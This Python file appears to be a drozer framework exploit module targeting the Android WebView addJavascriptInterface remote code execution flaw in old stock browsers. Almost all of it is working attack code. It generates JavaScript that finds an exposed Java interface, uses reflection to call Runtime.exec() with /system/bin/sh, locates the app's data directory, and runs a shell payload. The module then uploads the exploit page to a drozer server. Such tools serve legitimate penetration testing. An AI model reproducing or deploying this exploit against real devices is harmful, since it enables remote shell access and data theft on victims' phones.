from drozer.modules import common, Module

class addJavaScriptInterface(Module, common.Exploit):
    
    name = "WebView addJavascriptInterface Remote Code Execution"
    description = """Exploit a browser that implements a JavaScript Interface. 

Reference: https://labs.mwrinfosecurity.com/advisories/2013/09/24/webview-addjavascriptinterface-remote-code-execution/

This module works on the stock Android Browser < 4.2 and a number of other third-party browsers

    """
    examples = "$ drozer exploit build exploit.remote.browser.addjavascriptinterface --payload weasel.shell.armeabi --server 10.10.10.10"
    author = ["Tyrone (@mwrlabs)", "nmonkee (@mwrlabs)"]
    date = "2013-11-07"
    license = "BSD (3 clause)"
    path = ["exploit", "remote", "browser"]
    module_type = "exploit"

    payloads = ["weasel.shell.armeabi"] 

    def __init__(self, session, loader):
        Module.__init__(self, session)
        common.Exploit.__init__(self, loader)

        self.payload_format = "N"
        self.working_directory = "."

    def add_arguments(self, parser):
        parser.add_argument("--resource", default=None, help="specify the path component of the resultant exploit URI")

    def generate(self, arguments):

        drozer_js = """
/* Iterate through entire window looking for javascript interface */
function getJsVar()
{
    for (var prop in window)
    {
        try
        {
            window[prop].getClass();
            return window[prop];  
        }
        catch(err)
        {
            //console.log(err);
        }
    }

    console.log("Could not find JS interface");
    return null;
}

/* Execute command and receive result */
function execute(cmd)
{
    /* Find interface variable */
    var jsVar = getJsVar();
    if (jsVar == null)
        return null;

    /* Reflection-fu to get to Runtime.exec() and passing commands to sh */
    var inputStream = jsVar.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(['/system/bin/sh', '-c', cmd]).getInputStream();
    var output = "";

    /* Iterate through response */
    do
    {
        var readint = inputStream.read();

        if (readint > -1)
            output += String.fromCharCode(readint);
    }
    while (readint > -1);

    return output;
}

/* Get application data directory */
function getDataDir()
{
    var id = execute('id');
    var app_id = /(app_\d+|u0_a\d+)/g.exec(id);
    if (app_id.length > 0)
        app_id = app_id[0];
    else
        app_id = "failed";

    var ps = execute('ps');
    var ps_lines = ps.split("\\n").sort();

    for (var i in ps_lines)
    {
        try
        {
            if (ps_lines[i].indexOf(app_id) > -1)
            {
                var splits = ps_lines[i].split(" ");
                var last_col = splits[splits.length-1].trim();

                if (last_col.indexOf('.') > 0)
                    return '/data/data/' + last_col;
            }
        }
        catch(e)
        {
            console.log(e);
        }
    }
}

"""

        path = self.generate_or_default_path(arguments.resource)
        exploit = """<html><script type="text/javascript" src="dz.js"></script></html>"""

        # Add payload
        drozer_js += "execute(\"cd \" + getDataDir() + \";" + self.payload.strip().replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", " ;") + "\");\n"

        print "Uploading blank page to /...",
        if not self.upload(arguments, "/", " "):
            return

        print "Uploading Exploit to %s..." % path,
        if not self.upload(arguments, path, self.build_multipart({ ".*": exploit }, "gc0p4Jq0M2Yt08jU534c0p"), mimetype="text/html", headers={ "X-Drozer-Vary-UA": "true; boundary=gc0p4Jq0M2Yt08jU534c0p" }):
            return

        print "Uploading Exploit to /dz.js...",
        if not self.upload(arguments, "/dz.js", self.build_multipart({ ".*": drozer_js }, "gc0p4Jq0M2Yt08jU534c0p"), mimetype="application/x-javascript", headers={ "X-Drozer-Vary-UA": "true; boundary=gc0p4Jq0M2Yt08jU534c0p" }):
            return

        print "Done. The exploit is available on: http://%s:%d at path /^%s$/" % (arguments.server[0], arguments.server[1], path)